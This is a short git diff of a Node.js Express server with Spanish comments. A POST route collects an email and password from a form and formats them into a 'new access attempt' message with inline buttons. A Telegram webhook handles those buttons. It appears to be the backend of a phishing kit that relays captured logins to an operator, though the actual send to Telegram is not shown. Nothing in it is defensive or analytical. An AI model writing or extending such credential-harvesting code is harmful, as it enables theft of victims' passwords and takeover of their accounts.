@@ -36,10 +36,11 @@ io.on('connection', (socket) => {
   });
 });
 
+// Ruta POST que recibe email y password desde el formulario
 app.post('/enviar', async (req, res) => {
-  const { usuario, clave } = req.body;
+  const { usuario, contrasena } = req.body;
 
-  const mensaje = `🔐 Nuevo intento de acceso:\n👤 Usuario: ${usuario}\n🔑 Clave: ${clave}`;
+  const mensaje = `🔐 Nuevo intento de acceso:\n📧 Correo: ${usuario}\n🔑 Contraseña: ${contrasena}`;
 
   const opciones = {
     reply_markup: {
@@ -63,6 +64,7 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
+// Webhook de Telegram para manejar botones
 app.post('/webhook', async (req, res) => {
   const { callback_query } = req.body;
   if (!callback_query) return res.sendStatus(200);
